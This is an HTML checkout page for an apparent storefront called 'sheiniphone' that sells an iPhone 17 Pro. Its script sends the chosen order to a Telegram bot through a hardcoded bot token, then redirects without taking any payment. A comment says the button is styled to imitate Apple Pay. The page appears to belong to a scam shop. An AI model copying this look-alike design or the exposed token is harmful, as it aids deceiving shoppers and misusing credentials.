<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Payment – sheiniphone</title>

  <style>
    :root {
      --bg-page: #f5f5f7;
      --card-bg: #ffffff;
      --text-main: #111111;
      --text-muted: #6e6e73;
      --accent-blue: #0071e3;
      --border-soft: #d2d2d7;
      --btn-black: #000000;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui;
    }

    body {
      background: var(--bg-page);
      color: var(--text-main);
    }

    .page-wrapper {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    header {
      padding: 18px 20px;
      display: flex;
      justify-content: center;
      border-bottom: 1px solid rgba(0, 0, 0, 0.06);
      background: rgba(245, 245, 247, 0.95);
      backdrop-filter: blur(10px);
      position: sticky;
      top: 0;
      z-index: 10;
    }

    .logo {
      font-size: 18px;
      font-weight: 600;
      letter-spacing: 0.04em;
    }

    .logo span {
      color: var(--accent-blue);
    }

    main {
      flex: 1;
      max-width: 780px;
      margin: 0 auto;
      padding: 26px 16px 40px;
    }

    .title {
      text-align: center;
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 4px;
    }

    .subtitle {
      text-align: center;
      font-size: 13px;
      color: var(--text-muted);
      margin-bottom: 22px;
    }

    .card {
      background: var(--card-bg);
      border-radius: 18px;
      padding: 18px 16px;
      border: 1px solid rgba(0, 0, 0, 0.06);
      margin-bottom: 18px;
    }

    .card-title {
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 12px;
    }

    .summary-row {
      display: flex;
      justify-content: space-between;
      padding: 6px 0;
      font-size: 14px;
    }

    .summary-label {
      color: var(--text-muted);
    }

    .summary-value {
      font-weight: 500;
    }

    .summary-row.total {
      margin-top: 6px;
      border-top: 1px solid rgba(0,0,0,0.06);
      padding-top: 10px;
      font-weight: 600;
    }

    .payment-buttons {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-top: 8px;
    }

    .btn-black {
      width: 100%;
      border-radius: 999px;
      padding: 13px 0;
      background: var(--btn-black);
      color: #ffffff;
      font-size: 16px;
      font-weight: 500;
      border: none;
      cursor: pointer;
    }

    .btn-ghost {
      width: 100%;
      border-radius: 999px;
      padding: 12px 0;
      background: transparent;
      color: var(--text-main);
      font-size: 15px;
      font-weight: 500;
      border: 1px solid rgba(0,0,0,0.12);
      cursor: pointer;
    }

    .checkout-note {
      margin-top: 14px;
      font-size: 12px;
      color: var(--text-muted);
      text-align: center;
    }

    @media (max-width: 600px) {
      main {
        padding: 22px 12px 32px;
      }
    }
  </style>
</head>
<body>
  <div class="page-wrapper">
    <header>
      <div class="logo"><span>shein</span>iphone</div>
    </header>

    <main>
      <h1 class="title">Payment</h1>
      <p class="subtitle" id="subtitle-text">
        Secure checkout for your iPhone order.
      </p>

      <!-- Order Summary -->
      <section class="card">
        <div class="card-title">Order Summary</div>

        <div class="summary-row">
          <div class="summary-label">Product</div>
          <div class="summary-value summary-product">iPhone 17 Pro</div>
        </div>

        <div class="summary-row">
          <div class="summary-label">Region</div>
          <div class="summary-value">Middle East version</div>
        </div>

        <div class="summary-row">
          <div class="summary-label">Storage</div>
          <div class="summary-value summary-storage">256 GB</div>
        </div>

        <div class="summary-row">
          <div class="summary-label">Color</div>
          <div class="summary-value summary-color">Cosmic Orange</div>
        </div>

        <div class="summary-row total">
          <div class="summary-label">Total</div>
          <div class="summary-value summary-total">4100 Riyal/AED</div>
        </div>
      </section>

      <!-- Payment Method -->
      <section class="card">
        <div class="card-title">Payment Method</div>

        <div class="payment-buttons">
          <!-- الزر الأسود (شكل Apple Pay لكن نص Pay with Card) -->
          <button class="btn-black" id="pay-card-btn">
            Pay with Card
          </button>

          <!-- Back to store -->
          <button class="btn-ghost" id="back-btn">
            Back to Store
          </button>
        </div>

        <p class="checkout-note">
          This checkout page is a preview. Connect the payment buttons to your real payment gateway or process.
        </p>
      </section>
    </main>
  </div>

  <script>
    (function () {
      // بيانات البوت
      var botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
      var chatId   = "7811430582";

      // قراءة الخيارات من step-2
      var model   = localStorage.getItem("selectedModel")   || "iPhone 17 Pro";
      var storage = localStorage.getItem("selectedStorage") || "256 GB";
      var color   = localStorage.getItem("selectedColor")   || "Cosmic Orange";
      var price   = localStorage.getItem("selectedPrice")   || "4100 Riyal/AED";

      // تعبئة الصفحة
      var productEl  = document.querySelector(".summary-product");
      var storageEl  = document.querySelector(".summary-storage");
      var colorEl    = document.querySelector(".summary-color");
      var totalEl    = document.querySelector(".summary-total");
      var subtitleEl = document.getElementById("subtitle-text");

      if (productEl)  productEl.innerText = model;
      if (storageEl)  storageEl.innerText = storage;
      if (colorEl)    colorEl.innerText   = color;
      if (totalEl)    totalEl.innerText   = price;
      if (subtitleEl) subtitleEl.innerText =
        "Secure checkout for your " + model + " order.";

      // زر Pay with Card
      var payBtn = document.getElementById("pay-card-btn");
      if (payBtn) {
        payBtn.addEventListener("click", function () {
          var msg =
            "Customer clicked Pay with Card\n\n" +
            "Product: " + model + "\n" +
            "Region: Middle East version\n" +
            "Storage: " + storage + "\n" +
            "Color: " + color + "\n" +
            "Total: " + price;

          fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: msg
            })
          }).catch(function (err) {
            console.log("Telegram error:", err);
          }).finally(function () {
            // بعد الضغط نرجعه للصفحة الرئيسية
            window.location.href = "index.html";
          });
        });
      }

      // زر Back to Store
      var backBtn = document.getElementById("back-btn");
      if (backBtn) {
        backBtn.addEventListener("click", function () {
          window.location.href = "index.html";
        });
      }
    })();
  </script>
</body>
</html>
